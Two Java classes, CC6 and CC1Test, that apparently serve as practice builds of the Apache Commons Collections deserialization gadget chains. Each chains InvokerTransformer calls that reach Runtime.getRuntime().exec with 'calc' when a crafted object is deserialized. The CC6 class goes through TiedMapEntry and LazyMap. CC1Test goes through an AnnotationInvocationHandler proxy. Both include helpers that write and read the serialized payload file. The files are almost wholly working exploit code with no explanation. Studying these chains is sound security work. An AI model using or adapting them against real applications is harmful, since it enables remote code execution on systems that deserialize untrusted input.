package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
        public static void main(String[] args) throws Exception {

            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
            };

            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            HashMap<Object, Object> map = new HashMap<>();
            Map lazymap = LazyMap.decorate(map, new ConstantTransformer(1));

            TiedMapEntry tiedMapEntry= new TiedMapEntry(lazymap, "aaa");

            HashMap<Object, Object> map2 = new HashMap<>();
            map2.put(tiedMapEntry, "bbb");
            lazymap.remove("aaa");

            Class c = LazyMap.class;
            Field declaredField = c.getDeclaredField("factory");
            declaredField.setAccessible(true);
            declaredField.set(lazymap, chainedTransformer);

            //serialize(map2);
            unserialize("ser");



        }

        public static void serialize(Object obj) throws IOException {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser"));
            oos.writeObject(obj);
        }

        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
            Object obj = ois.readObject();
            return obj;
        }
    }




package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.crypto.dsig.Transform;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1Test {
    public static void main(String[] args) throws Exception {
        //Runtime.getRuntime().exec("calc");
 //       Runtime r = Runtime.getRuntime();
////        Class<Runtime> c = Runtime.class;
////        Method execMethod = c.getMethod("exec", String.class);
////        execMethod.invoke(r, "calc");
//
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});

//        for(Map.Entry entry:transformedMap.entrySet()){
//            entry.setValue(r);
//        }

//        Method getRuntimeMethod = ((Method) new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class));
//        Runtime r = ((Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod));
//        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(r);

//        Class<Runtime> c = Runtime.class;
//        Method getRuntimeMethod = c.getMethod("getRuntime", null);
//        Runtime r = ((Runtime) getRuntimeMethod.invoke(null, null));
//        //Method execMethod = c.getMethod("exec", String.class);
//        r.exec("calc");

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

//        HashMap<Object, Object> map = new HashMap<>();
//        map.put("value", "value");
//        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
//
//        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor<?> annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
//        annotationInvocationConstructor.setAccessible(true);
//        Object o = annotationInvocationConstructor.newInstance(Target.class, transformedMap);
//        serialize(o);
//        unserialize("ser");

        HashMap<Object, Object> map = new HashMap<>();
        Map lazymap = LazyMap.decorate(map, chainedTransformer);

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationConstructor.setAccessible(true);
        InvocationHandler o = ((InvocationHandler) annotationInvocationConstructor.newInstance(Target.class, lazymap));

        Map map1 = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, o);
        Object o1 = annotationInvocationConstructor.newInstance(Target.class, map1);
        serialize(o);
        unserialize("ser.bin");

    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
